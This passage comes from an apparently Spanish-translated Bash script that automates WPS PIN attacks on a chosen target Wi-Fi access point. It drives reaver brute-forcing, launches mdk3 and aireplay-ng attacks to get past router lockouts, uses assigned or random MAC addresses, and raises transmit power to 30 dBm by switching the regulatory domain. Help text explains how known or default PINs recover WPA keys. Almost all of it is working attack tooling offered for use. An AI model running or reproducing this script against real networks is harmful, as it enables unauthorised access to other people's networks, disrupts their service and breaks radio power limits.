echo -e "$warn  Dispositivo debe ser compatible con la inyección de paquetes.$txtrst"
echo ""
read  -p "   Ingrese Número de línea Aquí: " grep_Line_Number

echo -e "$txtrst"
DEV=$(cat airmon03.txt| sed -n ""$grep_Line_Number"p")

# Eliminar espacios finales blancos deja espacios entre nombres intactos

DEV=$(echo $DEV | xargs)

rm -f airmon01.txt
rm -f airmon02.txt
rm -f airmon03.txt

	while true
	do

echo ""
echo -e "$inp  Entraste$yel $DEV$info escribe$yel (y/Y)$inp para confirmar o$yel (n/N)$inp para volver a intentarlo.$txtrst"
read DEVTEST

	case $DEVTEST in
	y|Y|n|N) break ;;
	~|~~)
	echo Aborting -
	exit
	;;

	esac
	echo -e  "$warn  !!!De entrada incorrecto, inténtelo de nuevo!!!$txtrst"

	done

		done

clear

}

#~~~~~~~~~~~~~~~fin Seleccione el dispositivo fin~~~~~~~~~~~~~~~#

#~~~~~~~~~~~~~~~Boost dispositivo~~~~~~~~~~~~~~~#

BOOST_DEVICE_fn()
{
ifconfig $DEV down
sleep .1
iwconfig $DEV mode managed
sleep .1
ifconfig $DEV up

clear
	while true
	do

echo ""
echo -e "$q    Desea aumentar su poder dispositivo wifi para 30dBm?"
echo -e "$info  Esta rutina obras para la AWUSO36H y" #(AWUSO)
echo -e "$info  puede funcionar con otros dispositivos."
echo -e "$inp  Escribe$yel (y/Y)$inp para sí o$yel (n/N)$inp sin.$txtrst"
		read AWUSO
		case $AWUSO in
		y|Y|n|N) break ;;
		~|~~)
		echo abortar -
		exit
		;;

		esac
		echo -e  "$warn !!!De entrada incorrecto, inténtelo de nuevo!!!$txtrst"

			done

	if [ $AWUSO == y ] || [ $AWUSO == Y ]; then

		ifconfig $DEV down
		sleep 1
		iw reg set GY
		ifconfig $DEV up
		iwconfig $DEV channel 13
		iwconfig $DEV txpower 30
		sleep 1
 
			fi

clear

}

#~~~~~~~~~~~~~~~fin Boost dispositivo fin~~~~~~~~~~~~~~~#

#~~~~~~~~~~~~~~~Seleccione monitor~~~~~~~~~~~~~~~#

SELECT_MONITOR_fn()
{

airmon-old_fn start $DEV &> /dev/null

sleep 1

until  [ $MONTEST == y ] || [ $MONTEST == Y ]; do

echo -e  "$txtrst"
airmon-old_fn | tee airmon01.txt

cat < airmon01.txt | awk -F' ' '{ if(($1 != "Interface")) {print $1}}' > airmon02.txt

cat < airmon02.txt | awk -F' ' '{ if(($1 != "")) {print $1}}' > airmon03.txt

  AIRMONNAME=$(cat airmon03.txt | nl -ba -w 1  -s ': ')

echo ""
echo -e "$info Dispositivos encontrado por airmon-ng.$txtrst"
echo " "
echo "$AIRMONNAME" | sed 's/^/       /'
echo ""
echo -e "$q    Qué interfaz de monitor inalámbrico$yel ( mon0, mon1)$q será"
echo -e "  ser utilizado por reaver?$txtrst"
echo ""
read  -p "   Ingrese número de línea Aquí: " grep_Line_Number

echo -e "$txtrst"
MON=$(cat airmon03.txt| sed -n ""$grep_Line_Number"p")

# Eliminar espacios finales blancos deja espacios entre nombres intactos

MON=$(echo $MON | xargs)

rm -f airmon01.txt
rm -f airmon02.txt
rm -f airmon03.txt

	while true
	do

echo ""
echo -e "$inp  Entraste$yel $MON$info escribe$yel (y/Y)$inp para confirmar o$yel (n/N)$inp para volver a intentarlo.$txtrst"
read MONTEST

	case $MONTEST in
	y|Y|n|N) break ;;
	~|~~)
	echo abortar -
	exit
	;;

	esac
	echo -e  "$warn  !!!De entrada incorrecto, inténtelo de nuevo!!!$txtrst"

	done

		done

        clear
}
#~~~~~~~~~~~~~~~fin Seleccione monitor fin~~~~~~~~~~~~~~~#

#~~~~~~~~~~~~~~~Empezar MAC Tratamiento de errores Empezar~~~~~~~~~~~~~~~# 

MACERROR_HANDEL_fn()
{
####
# Control de errores Para los comentarios Código de Mac
# Pruebas de longitud de cuerda
# Las pruebas de presencia de tan sólo ::::: caracteres de puntuación
# Pruebas sólo caracteres hexagonales presente
# Establece puntuacion correcta para la prueba

MACPUNCT=":::::"

sleep .2

#pruebas de puntuacion

PUNCTEST=`echo "$TARGETAP1" | tr -d -c ".[:punct:]"`

sleep .2

if [ "$PUNCTEST" == "$MACPUNCT" ]

	then

	    PUNCT=1

	else

	    PUNCT=0

	fi

sleep .2

#Pruebas de caracteres hexadecimales

MACALNUM=`echo "$TARGETAP1" | tr -d -c ".[:alnum:]"`

sleep .2


if [[ $MACALNUM =~ [A-Fa-f0-9]{12} ]]

then

	ALNUM=1
else

	ALNUM=0
  fi

sleep .2

#Longitud Pruebas de cadena

if [ ${#TARGETAP1} = 17 ]

then

	MACLEN=1
else

	MACLEN=0
  fi

sleep .2

# Todas las variables establecidas para unos y ceros

until [ $MACLEN == 1 ] && [ $PUNCT == 1 ] && [ $ALNUM == 1 ]; do

	if [ $ALNUM == 0 ]; then
		echo -e "$warn  Está utilizando un carácter no hexadecimal.$txtrst"

			fi
	
	if [ $MACLEN == 0 ]; then
		echo -e "$warn  Su código de Mac es la longitud incorrecta.$txtrst"

			fi

	if [ $PUNCT == 0 ]; then

		echo -e "$warn  Ha introducido los separadores equivocadas y / o demasiados - Utilice sólo dos puntos :$txtrst"

			fi

	echo -e "$info  Mac entrada código incorrecto!!!"
        echo "  Usted debe utilizar el formato 00: 11: 22: 33: 44: 55 o aa:AA:bb:BB:cc:CC"
	echo "  Sólo un a través de f, A a F, 0-9 y el symbol :  están permitidos."
	echo -e "$inp  Vuelva a escribir el código de Mac y vuelva a intentarlo(TARGETAP1).$txtrst"
	read TARGETAP1

        MACALNUM=`echo "$TARGETAP1" | tr -d -c ".[:alnum:]"`
	if [[ $MACALNUM =~ [A-Fa-f0-9]{12} ]]

        then

        	ALNUM=1

        else

	        ALNUM=0

			fi

sleep .2       

	if [ ${#TARGETAP1} == 17 ]

	then

		MACLEN=1
	else

		MACLEN=0

			fi

sleep .2

	PUNCTEST=`echo "$TARGETAP1" | tr -d -c ".[:punct:]"`
	if [ $PUNCTEST == $MACPUNCT ]

	then

	    PUNCT=1

	else

	    PUNCT=0

			fi

sleep 1

done
}  

#~~~~~~~~~~~~~~~fin MAC Tratamiento de errores fin~~~~~~~~~~~~~~~#

#~~~~~~~~~~~~~~~Empezar Entrada manual HIDDEN SSID Manipulación Empezar~~~~~~~~~~~~~~~#

MANUAL_SELECT_fn()
{
clear
echo -e "$info

    Revise los comentarios - Para cambiar entrar$yel número de línea$info de entrada y
  siga las indicaciones del programa.

    1) TargetAPs' Nombre  \e[1;36m $inp [$yel $NAME1 $inp]
$info
    2) Dirección MAC      \e[1;36m $inp [$yel $TARGETAP1 $inp]
$info
    3) Canal          \e[1;36m $inp [$yel $CHANNEL_MAN $inp]
$info
    C)continuar

\n"
read var
case $var in

	1) echo -e "\033[36m\n$info TargetAP Nombre?$txtrst"
	read NAME1
	MANUAL_SELECT_fn;;

	2) echo -e "\033[36m\n$info Dirección MAC?$txtrst"
	read TARGETAP1
	MACERROR_HANDEL_fn
	MANUAL_SELECT_fn;;

	3) echo -e "\033[36m\n$info Channel?$txtrst"
	read CHANNEL_MAN
	MANUAL_SELECT_fn;;


	c|C) if [[ -z $NAME1 || -z $TARGETAP1 || -z $CHANNEL_MAN ]];then
		echo -e "\033[31m$warn Algo está mal - probar de nuevo"
		sleep 1
		MANUAL_SELECT_fn
		fi;;

	*) 	MANUAL_SELECT_fn;;
esac

MACALNUM=`echo "$TARGETAP1" | tr -d -c ".[:alnum:]"`

}

#~~~~~~~~~~~~~~~fin Entrada manual HIDDEN SSID Manipulación fin~~~~~~~~~~~~~~~#


#~~~~~~~~~~~~~~~Empezar Error MAC Manejo Dev MANUAL DE ENTRADA y mon0 Empezar~~~~~~~~~~~~~~~# 

ASSGNERROR_HANDEL_fn()

{
####
# Control de errores Para los comentarios Código de Mac
# Pruebas de longitud de cuerda
# Las pruebas de presencia de tan sólo ::::: caracteres de puntuación
# Pruebas sólo caracteres hexagonales presente
# Establece puntuacion correcta para la prueba

MACPUNCT=":::::"

sleep .2

#pruebas de puntuacion

PUNCTEST=`echo "$ASSIGN_MAC" | tr -d -c ".[:punct:]"`

sleep .2

if [ "$PUNCTEST" == "$MACPUNCT" ]

	then

	    PUNCT=1

	else

	    PUNCT=0

	fi

sleep .2

#Pruebas de caracteres hexadecimales

MACALNUM=`echo "$ASSIGN_MAC" | tr -d -c ".[:alnum:]"`

sleep .2


if [[ $MACALNUM =~ [A-Fa-f0-9]{12} ]]

then

	ALNUM=1
else

	ALNUM=0
  fi

sleep .2

#Longitud Pruebas de cadena

if [ ${#ASSIGN_MAC} = 17 ]

then

	MACLEN=1
else

	MACLEN=0
  fi

sleep .2

	if [ $ALNUM == 0 ]; then
		echo -e "    Está utilizando un carácter no hexadecimal.$txtrst"

			fi
	
	if [ $MACLEN == 0 ]; then
		echo -e "    Su código de Mac es la longitud incorrecta.$txtrst"

			fi

	if [ $PUNCT == 0 ]; then

		echo -e "    Ha introducido los separadores equivocadas y / o demasiados - Utilice sólo dos puntos :$txtrst"

			fi

	if [ $ALNUM == 0 ] || [ $MACLEN == 0 ] || [ $PUNCT == 0 ]; then

	echo ""
	echo -e "    Entrada de código de Mac ASSIGN_MAC=$ASSIGN_MAC Es incorrecto!!!"
        echo "  Usted debe utilizar el formato 00: 11: 22: 33: 44: 55 o aa:AA:bb:BB:cc:CC"
	echo "  Sólo un a través de f, A a F, 0-9 y el símbolo: se admiten."
	echo ""

			fi

}  

#~~~~~~~~~~~~~~~fin Error MAC Manejo Dev MANUAL DE ENTRADA y mon0 fin~~~~~~~~~~~~~~~#

#~~~~~~~~~~~~~~~Start Reaver Menu Start~~~~~~~~~~~~~~~#

REAVER_MENU_fn()
{
echo -e " "
echo -e "$info             Comenzando Reaver"
echo -e "$info TargetAP Nombre                         = $yel$NMEWARN1"
echo -e "$info controlar                               = $yel$MON"
echo -e "$info Canal(Nota 0 = salto de canal)          = $yel$CHANNEL1"
echo -e "$info Código de Mac de destino AP             = $yel$TARGETAP1"

if  [ $MACSEL == y ] || [ $MACSEL == Y ]; then

echo -e "$info Asignado código de Mac                  = $yel$VARMAC"

		fi

if  [ $MACSEL == n ] || [ $MACSEL == N ]; then

echo -e "$info Código aleatorio Mac                    = $yel$VARMAC"

		fi

echo -e "$info Reaver tiempo en directo                = $yel$LIVE1$info segundo"
echo -e "$info Reaver Empezar/stop ciclos restantes    = $yel$COUNT"

	 if [ $USE_R1 == y ] || [ $USE_R1 == Y ]; then

echo -e "$info recurrente-delay pin intentos x         = $yel$RX1$info x" 
echo -e "$info recurrente-delay dormir en seg y        = $yel$RY1$info segundo"

	fi

echo -e "$info Text Log in$yel   /root/VARMAC_LOGS  = $NAME1-$DATEFILE-$PAD"

         if [ $ADVANMON == y ] || [ $ADVANMON == Y ]; then 

echo -e "$info Máxima Reaver Preescaneo Tiempo         = $yel$ADVAN_TIME$info segundo"

	fi

echo -e "$info Usando Config Archivo$yel/root/VARMAC_CONFIG/$SOURCENAME$info" 

    if [ ! -z $WPSPIN ]; then

echo -e "$info Pixieswps ha encontrado WPS Pin       = $yel$WPSPIN $txtrst"

		fi

}

#~~~~~~~~~~~~~~~Empezar WPS Pin Ayuda Empezar~~~~~~~~~~~~~~~#

WPS_PINHELP1_fn()
{
echo -e "$txtrst"
echo "    Un WPS conocido Pin es un pasador que se ha visto para ser utilizado con el router."
echo "  Si el PIN WPS se ha roto antes, pero la clave WPA se ha cambiado,"
echo "  hay una alta posibilidad de que la clave WPA puede romperse rápidamente usando el"
echo "  previamente visto PIN WPS. Los propietarios rara vez cambian su PIN WPS."
echo "    Un pin WPS por defecto se calcula por varios programas PIN predeterminado. Un router"
echo "  después de inicio / reinicio puede haber este perno instalado." 
echo "    Reaver permite al usuario probar específicos WPS Botón para guardar necesidad bruta"
echo "  obligar a todos los 11.000 alfileres. Si conoce el PIN WPS anterior del router, intente"
echo "  que el pin. VMR-MDK también puede calcular por defecto WPS Pins basado en el mac"
echo "  dirección (BSSID) y nombre de AP (essid)."
echo "    Selección (a / a) aquí va a permitir que el usuario introduzca un PIN WPS"
echo "  manualmente o seleccionar un pin por defecto de una lista computarizada. Selección (n/N)"
echo "  se apaga esta función y todas las 11.000 pines están obligados por el bruto"
echo "  reaver. Ataques de fuerza bruta todos los pines se utiliza en la mayoría de los casos."
echo ""
echo "                  !!!ADVERTENCIA ANTES DE USAR ESPECÍFICO PINS!!!"
echo "    Tiendas Reaver su trabajo en linux en la carpeta etc / reaver."
echo "  Si está utilizando una versión modded apoyo pixiedust entonces el data"
echo "  tal vez se encuentra en el /usr/local/etc/reaver/ carpeta. Para saber cuando éstas"
echo "  archivos se almacenan tipo localizar * .wpc en una ventana de terminal La data"
echo "  para cada AP atacado se mantiene en archivos individuales. Los nombres de los archivos dados"
echo "  son las direcciones MAC (BSSID) de los simios dirigidos."
echo ""
echo "                         Prueba de un específico Pin"
echo "    Si decide cambiar de un ataque de fuerza bruta probando todo pins,"
echo "  al uso de un PIN WPS específica, su número de pines fuerza bruta se puede perder."
echo "  Para evitar la fuerza bruta contra recuento específico Pin conflictos con reaver,"
echo "  Todas las pruebas de los archivos específicos de pasador se envían a la etc/reaver/ carpeta"
echo "  a través de la --session = comando y teniendo en cuenta el nombre del archivo:"
echo ""
echo "                   testpin-WPSpintested-mac dirección"
echo ""
echo "  Si la prueba de un pin específico falla, puede volver a su fuerza bruta con"
echo "  sin pérdida de reaver posición de número de pines."

}

#~~~~~~~~~~~~~~~fin WPS Pin Ayuda fin~~~~~~~~~~~~~~~#

#~~~~~~~~~~~~~~~Empezar Determinar estado bloqueado Empezar~~~~~~~~~~~~~~~#

TIMING_LOCKED_fn()
{

echo -e "$info Router Pausa / Tiempo de recuperación   = $yel$PAUSE$info segundo"
echo -e "$info MDK3 Tiempo de ataque                   = $yel$MDKLIVE$info segundo"

	if [ $MDKTYPE1 = 1 ]; then
 
echo -e "$info MDK3 Attack Type$yel $MDKTYPE1$info = $yel$MDKTXT1"

	elif [ $MDKTYPE1 = 2 ]; then

echo -e "$info MDK3 Attack Type$yel $MDKTYPE1$info = $yel$MDKTXT2"

	elif [ $MDKTYPE1 = 3 ]; then

echo -e "$info MDK3 Attack Type$yel $MDKTYPE1$info = $yel$MDKTXT3"

	elif [ $MDKTYPE1 = 4 ]; then

echo -e "$info MDK3 Attack Type$yel $MDKTYPE1$info = $yel$MDKTXT4"

	elif [ $MDKTYPE1 = 5 ]; then

echo -e "$info MDK3 Attack Type$yel $MDKTYPE1$info = $yel$MDKTXT5"

	elif [ $MDKTYPE1 = 6 ]; then

echo -e "$info MDK3 Attack Type$yel $MDKTYPE1$info = $yel$MDKTXT6"

	elif [ $MDKTYPE1 = 7 ]; then

echo -e "$info MDK3 Attack Type$yel $MDKTYPE1$info = $yel$MDKTXT7"

	elif [ $MDKTYPE1 = 8 ]; then

echo -e "$info MDK3 Attack Type$yel $MDKTYPE1$info = $yel$MDKTXT8"

	elif [ $MDKTYPE1 = 9 ]; then

echo -e "$info MDK3 Attack Type$yel $MDKTYPE1$info = $yel$MDKTXT9"

	elif [ $MDKTYPE1 = 10 ]; then

echo -e "$info MDK3 Attack Type$yel $MDKTYPE1$info = $yel$MDKTXT10"

	elif [ $MDKTYPE1 = 11 ]; then

echo -e "$info MDK3 Attack Type$yel $MDKTYPE1$info = $yel$MDKTXT11"

	elif [ $MDKTYPE1 = 12 ]; then

echo -e "$info MDK3 Attack Type$yel $MDKTYPE1$info = $yel$MDKTXT12"

	elif [ $MDKTYPE1 = 13 ]; then

echo -e "$info MDK3 Attack Type$yel $MDKTYPE1$info = $yel$MDKTXT13"

	elif [ $MDKTYPE1 = 14 ]; then

echo -e "$info MDK3 Attack Type$yel $MDKTYPE1$info = $yel$MDKTXT14"

	elif [ $MDKTYPE1 = 15 ]; then

echo -e "$info MDK3 Attack Type$yel $MDKTYPE1$info = $yel$MDKTXT15"

		fi

echo -e "$warn Monitorear WPS Pin Colección - Ajuste Reaver vivo Tiempo consecuencia!!!$txtrst"
echo -e ""

if [[ $ADVAN_TIME -lt 120 ]] &&  [[ $ADVANMON == y || $ADVANMON == Y ]]; then
 

	ADVAN_TIME=120

              fi

#######DETERMINAR WPS BLOQUEADO-NO ASSOC COMENZAR ########
# Divida el momento de tomar archivo encaje cada quinta vez 1/5 LIVE para evitar subproceso colgar con la cola.
LIVEDIV=$(((($ADVAN_TIME-30))/8))
LINECAP=2 # Interruptor de captura de línea de Set

if [[ $DAMP_MDK == y || $DAMP_MDK == Y ]]; then

if [ $LINECAP -eq 2 ]; then 
	AIREPLAY_fn

		echo -e "    Comenzando Stage I"    

	tput sc
	echo -e "$info  1. Escaneo $NAME1-$DATEFILE-$PAD para la actividad de AP(Stage I)."
	sleep 15
	killall -q aireplay-ng
	killall -q mdk3

           fi

if [ $LINECAP -eq 2 ]; then

while read line

	do

	 if [[ $line == "[+] Asociado con $TARGETAP1 (ESSID: $NMEWARN1)" ]] || [[ $line == "[+] Associated with $TARGETAP1 (ESSID: $NMEWARN1)" ]] || [[ $line == "YYY12" ]] || [[ $line == "YYY13" ]] || [[ $line == "YYY14" ]] || [[ $line == "YYY15" ]]; then 

                    LINECAP=1 # viejo let

		fi

#echo "1. Archivo de lectura para la actividad AP(Stage I)."

done < VARMAC_LOGS/$NAME1-$DATEFILE-$PAD

                   fi

PINFOUND_fn

contents=$(cat "VARMAC_LOGS/$NAME1-$DATEFILE-$PAD")
case $contents in
	*"$EAPOL"*)
	LINECAP=1

         esac

##########################

if [ $LINECAP -eq 2 ]; then 
	AIREPLAY_fn
	tput rc
	tput ed
	echo -e "$info  2. Escaneo$yel $NAME1-$DATEFILE-$PAD$info para la actividad de AP(Stage I)."
	sleep 15
	killall -q aireplay-ng
	killall -q mdk3
           fi

if [ $LINECAP -eq 2 ]; then

while read line

	do

	 if [[ $line == "[+] Asociado con $TARGETAP1 (ESSID: $NMEWARN1)" ]] || [[ $line == "[+] Associated with $TARGETAP1 (ESSID: $NMEWARN1)" ]] || [[ $line == "YYY12" ]] || [[ $line == "YYY13" ]] || [[ $line == "YYY14" ]] || [[ $line == "YYY15" ]]; then 

                    LINECAP=1 # viejo let

		fi

#echo "2. Archivo de lectura para la actividad AP(Stage I)."

done < VARMAC_LOGS/$NAME1-$DATEFILE-$PAD

                   fi

PINFOUND_fn

contents=$(cat "VARMAC_LOGS/$NAME1-$DATEFILE-$PAD")
case $contents in
	*"$EAPOL"*)
	LINECAP=1

         esac

##########################
if [ $LINECAP -eq 2 ]; then 
	AIREPLAY_fn
	tput rc
	tput ed
	echo -e "$info  3. Escaneo $NAME1-$DATEFILE-$PAD para la actividad de AP(Stage I)."
	sleep $LIVEDIV
	killall -q aireplay-ng
	killall -q mdk3
           fi

if [ $LINECAP -eq 2 ]; then

while read line

	do

	 if [[ $line == "[+] Asociado con $TARGETAP1 (ESSID: $NMEWARN1)" ]] || [[ $line == "[+] Associated with $TARGETAP1 (ESSID: $NMEWARN1)" ]] || [[ $line == "YYY12" ]] || [[ $line == "YYY13" ]] || [[ $line == "YYY14" ]] || [[ $line == "YYY15" ]]; then 

                    LINECAP=1 # old let

		fi

#echo "3. Archivo de lectura para la actividad AP(Stage I)."

done < VARMAC_LOGS/$NAME1-$DATEFILE-$PAD

                   fi

PINFOUND_fn

contents=$(cat "VARMAC_LOGS/$NAME1-$DATEFILE-$PAD")
case $contents in
	*"$EAPOL"*)
	LINECAP=1

         esac

##########################
if [ $LINECAP -eq 2 ]; then 
	AIREPLAY_fn
	tput rc
	tput ed
	echo -e "$info  4. Escaneo$yel $NAME1-$DATEFILE-$PAD$info para la actividad de AP(Stage I)."
	sleep $LIVEDIV
	killall -q aireplay-ng
	killall -q mdk3
           fi

if [ $LINECAP -eq 2 ]; then

while read line

	do

	 if [[ $line == "[+] Asociado con $TARGETAP1 (ESSID: $NMEWARN1)" ]] || [[ $line == "[+] Associated with $TARGETAP1 (ESSID: $NMEWARN1)" ]] || [[ $line == "YYY12" ]] || [[ $line == "YYY13" ]] || [[ $line == "YYY14" ]] || [[ $line == "YYY15" ]]; then 

                    LINECAP=1 # viejo let

		fi

#echo "4. Archivo de lectura para la actividad AP(Stage I)."

done < VARMAC_LOGS/$NAME1-$DATEFILE-$PAD

                   fi

PINFOUND_fn

contents=$(cat "VARMAC_LOGS/$NAME1-$DATEFILE-$PAD")
case $contents in
	*"$EAPOL"*)
	LINECAP=1

         esac

##########################
if [ $LINECAP -eq 2 ]; then 
	AIREPLAY_fn
	tput rc
	tput ed	
	echo -e "$info  5. Escaneo $NAME1-$DATEFILE-$PAD para la actividad de AP(Stage I)."
	sleep $LIVEDIV
	killall -q aireplay-ng
	killall -q mdk3

           fi

if [ $LINECAP -eq 2 ]; then

while read line

	do

	 if [[ $line == "[+] Asociado con $TARGETAP1 (ESSID: $NMEWARN1)" ]] || [[ $line == "[+] Associated with $TARGETAP1 (ESSID: $NMEWARN1)" ]] || [[ $line == "YYY12" ]] || [[ $line == "YYY13" ]] || [[ $line == "YYY14" ]] || [[ $line == "YYY15" ]]; then 

                    LINECAP=1 # viejo let

		fi

#echo "5. Archivo de lectura para la actividad AP(Stage I)."

done < VARMAC_LOGS/$NAME1-$DATEFILE-$PAD

                   fi

PINFOUND_fn

contents=$(cat "VARMAC_LOGS/$NAME1-$DATEFILE-$PAD")
case $contents in
	*"$EAPOL"*)
	LINECAP=1

         esac

##########################
if [ $LINECAP -eq 2 ]; then 
	AIREPLAY_fn
	tput rc
	tput ed	
	echo -e "$info  6. Escaneo$yel $NAME1-$DATEFILE-$PAD$info para la actividad de AP(Stage I)."
	sleep $LIVEDIV
	killall -q aireplay-ng
	killall -q mdk3
           fi

if [ $LINECAP -eq 2 ]; then

while read line

	do

	 if [[ $line == "[+] Asociado con $TARGETAP1 (ESSID: $NMEWARN1)" ]] || [[ $line == "[+] Associated with $TARGETAP1 (ESSID: $NMEWARN1)" ]] || [[ $line == "YYY12" ]] || [[ $line == "YYY13" ]] || [[ $line == "YYY14" ]] || [[ $line == "YYY15" ]]; then 

                    LINECAP=1 # viejo let

		fi

#echo "6. Archivo de lectura para la actividad AP(Stage I)."

done < VARMAC_LOGS/$NAME1-$DATEFILE-$PAD

                   fi

PINFOUND_fn

contents=$(cat "VARMAC_LOGS/$NAME1-$DATEFILE-$PAD")
case $contents in
	*"$EAPOL"*)
	LINECAP=1

         esac

##########################
if [ $LINECAP -eq 2 ]; then 
	AIREPLAY_fn
	tput rc
	tput ed
	echo -e "$info  7. Escaneo $NAME1-$DATEFILE-$PAD para la actividad de AP(Stage I)."
	sleep $LIVEDIV
	killall -q aireplay-ng
	killall -q mdk3

           fi

if [ $LINECAP -eq 2 ]; then

while read line

	do

	 if [[ $line == "[+] Asociado con $TARGETAP1 (ESSID: $NMEWARN1)" ]] || [[ $line == "[+] Associated with $TARGETAP1 (ESSID: $NMEWARN1)" ]] || [[ $line == "YYY12" ]] || [[ $line == "YYY13" ]] || [[ $line == "YYY14" ]] || [[ $line == "YYY15" ]]; then 

                    LINECAP=1 # viejo let

		fi

#echo "7. Archivo de lectura para la actividad AP(Stage I)."

done < VARMAC_LOGS/$NAME1-$DATEFILE-$PAD

                   fi

PINFOUND_fn

contents=$(cat "VARMAC_LOGS/$NAME1-$DATEFILE-$PAD")
case $contents in
	*"$EAPOL"*)
	LINECAP=1

         esac

##########################
if [ $LINECAP -eq 2 ]; then 
	AIREPLAY_fn
	tput rc
	tput ed
	echo -e "$info  8. Escaneo$yel $NAME1-$DATEFILE-$PAD$info para la actividad de AP(Stage I)."
	sleep $LIVEDIV
	killall -q aireplay-ng
	killall -q mdk3

           fi

if [ $LINECAP -eq 2 ]; then

while read line

	do

	 if [[ $line == "[+] Asociado con $TARGETAP1 (ESSID: $NMEWARN1)" ]] || [[ $line == "[+] Associated with $TARGETAP1 (ESSID: $NMEWARN1)" ]] || [[ $line == "YYY12" ]] || [[ $line == "YYY13" ]] || [[ $line == "YYY14" ]] || [[ $line == "YYY15" ]]; then 

                    LINECAP=1 # viejo let

		fi

#echo "8. Archivo de lectura para la actividad AP(Stage I)."

done < VARMAC_LOGS/$NAME1-$DATEFILE-$PAD

                   fi

PINFOUND_fn

contents=$(cat "VARMAC_LOGS/$NAME1-$DATEFILE-$PAD")
case $contents in
	*"$EAPOL"*)
	LINECAP=1

         esac

##########################
if [ $LINECAP -eq 2 ]; then 
	AIREPLAY_fn
	tput rc
	tput ed
	echo -e "$info  9. Escaneo $NAME1-$DATEFILE-$PAD para la actividad de AP(Stage I)."
	sleep $LIVEDIV
	killall -q aireplay-ng
	killall -q mdk3

           fi

if [ $LINECAP -eq 2 ]; then

while read line

	do

	 if [[ $line == "[+] Asociado con $TARGETAP1 (ESSID: $NMEWARN1)" ]] || [[ $line == "[+] Associated with $TARGETAP1 (ESSID: $NMEWARN1)" ]] || [[ $line == "YYY12" ]] || [[ $line == "YYY13" ]] || [[ $line == "YYY14" ]] || [[ $line == "YYY15" ]]; then 

                    LINECAP=1 # viejo let

		fi

#echo "9. Archivo de lectura para la actividad AP(Stage I)."

done < VARMAC_LOGS/$NAME1-$DATEFILE-$PAD

                   fi

PINFOUND_fn

contents=$(cat "VARMAC_LOGS/$NAME1-$DATEFILE-$PAD")
case $contents in
	*"$EAPOL"*)
	LINECAP=1

         esac

##########################
if [ $LINECAP -eq 2 ]; then 
	AIREPLAY_fn
	tput rc
	tput ed
	echo -e "$info  10. Escaneo$yel $NAME1-$DATEFILE-$PAD$info para la actividad de AP(Stage I)."
	sleep $LIVEDIV
	killall -q aireplay-ng
	killall -q mdk3

           fi

if [ $LINECAP -eq 2 ]; then

while read line

	do

	 if [[ $line == "[+] Asociado con $TARGETAP1 (ESSID: $NMEWARN1)" ]] || [[ $line == "[+] Associated with $TARGETAP1 (ESSID: $NMEWARN1)" ]] || [[ $line == "YYY12" ]] || [[ $line == "YYY13" ]] || [[ $line == "YYY14" ]] || [[ $line == "YYY15" ]]; then 

                    LINECAP=1 # viejo let # viejo let

		fi

#echo "10. Archivo de lectura para la actividad AP(Stage I)."

done < VARMAC_LOGS/$NAME1-$DATEFILE-$PAD

                   fi

PINFOUND_fn

contents=$(cat "VARMAC_LOGS/$NAME1-$DATEFILE-$PAD")
case $contents in
	*"$EAPOL"*)
	LINECAP=1

         esac

		fi  # Linked to=if [[ $ADVANMON == y ]] || [[ $ADVANMON == Y ]]; then

############################ fin de supervisión avanzada #########################


    if [[ $DAMP_MDK == n || $DAMP_MDK == N ]]; then

		LINECAP=1

			fi


#####MONITOR ADVAN y MDK3 Suprimir Selecciones

####  MDK3 suprimir la Nota si DAMPEN_MDK3=y después ADVANMON=y $LINECAP -eq 1

if  [[ $REAVER_COUNT == y || $REAVER_COUNT == Y ]] && [[ $DAMP_MDK == y || $DAMP_MDK == Y ]] && [[ $LINECAP -eq 1 ]]; then

AIREPLAY_fn

seconds=$LIVE1; date1=$((`date +%s` + $seconds)); 

while [ "$date1" -ne `date +%s` ]; do 
echo -ne "$txtrst Stage II$info Started - Reaver el tiempo restante en vivo. $yel $(date -u --date @$(($date1 - `date +%s` )) +%H:%M:%S)\r"; 

	done

		fi

if  [[ $REAVER_COUNT == n || $REAVER_COUNT == N ]] && [[ $DAMP_MDK == y || $DAMP_MDK == Y ]] && [[ $LINECAP -eq 1 ]]; then


AIREPLAY_fn
		echo " "
		echo -e "$txtrst Stage II$info - Pasos - Reaver tendrá una duración de$yel $LIVE1$info segundo."
		sleep $LIVE1

		fi

###########DAMP_MDK=n

if  [[ $REAVER_COUNT == y || $REAVER_COUNT == Y ]] && [[ $DAMP_MDK == n || $DAMP_MDK == N ]]; then

AIREPLAY_fn

seconds=$LIVE1; date1=$((`date +%s` + $seconds)); 

while [ "$date1" -ne `date +%s` ]; do 
echo -ne "$txtrst Stage II$info - Iniciado-Reaver tiempo restante en vivo. $yel $(date -u --date @$(($date1 - `date +%s` )) +%H:%M:%S)\r"; 

	done

		fi

if  [[ $REAVER_COUNT == n || $REAVER_COUNT == N ]] && [[ $DAMP_MDK == n || $DAMP_MDK == N ]]; then

AIREPLAY_fn
		echo " "
		echo -e "$txtrst Stage II$info - Reaver tendrá una duración de$yel $LIVE1$info segundo."
		sleep $LIVE1

		fi

echo -e "$txtrst"

PIDREV=$(airmon-old_fn check | grep "reaver" | sed s/"(reaver) se está ejecutando en la interfaz $MON"//g)

#Proceso con PID 21599 (reaver) se está ejecutando en la interfaz mon0
#airmon-old_fn check | grep "reaver"



#
PIDREV1=${PIDREV##*D }
sleep 1
kill -s SIGINT $PIDREV1

sleep 2
killall -q aireplay-ng 
killall -q mdk3
sleep 1
killall -q Eterm

clear

}

#~~~~~~~~~~~~~~~fin Determinar estado bloqueado fin~~~~~~~~~~~~~~~#

#~~~~~~~~~~~~~~~Empezar WPS_DEFAULT Empezar~~~~~~~~~~~~~~~#

WPS_DEFAULTPINS_fn()
{

until  [ $USE_PIN1TEST == y ] || [ $USE_PIN1TEST == Y ]; do

echo ""
echo -e "$q    Desea utilizar un incumplimiento o conocido WPS Pin contra la targetAP?"
echo ""
echo -e "$inp  seleccionar$yel (y/Y)$inp utilizar una específica WPS Pin."
echo ""
echo -e "$yel  -->$inp Ingrese $yel (n/N)$inp a la fuerza bruta de todo 11,000 pins.$yel<--"
echo ""
echo -e "$info  Para obtener ayuda sobre este tema ingrese$yel (h/H)$info.$txtrst"
echo -e "$warn  !!!ADVERTENCIA si selecciona$yel (y/Y)$inp leer los archivos de ayuda PRIMERA!!!"

read USE_PIN1

      if  [ $USE_PIN1 == h ] || [ $USE_PIN1 == H ]; then
				clear
				echo ""
				echo ""
				WPS_PINHELP1_fn

				fi

	while true
	do


      if  [ $USE_PIN1 == y ] || [ $USE_PIN1 == Y ] || [ $USE_PIN1 == n ] || [ $USE_PIN1 == N ]; then

echo ""
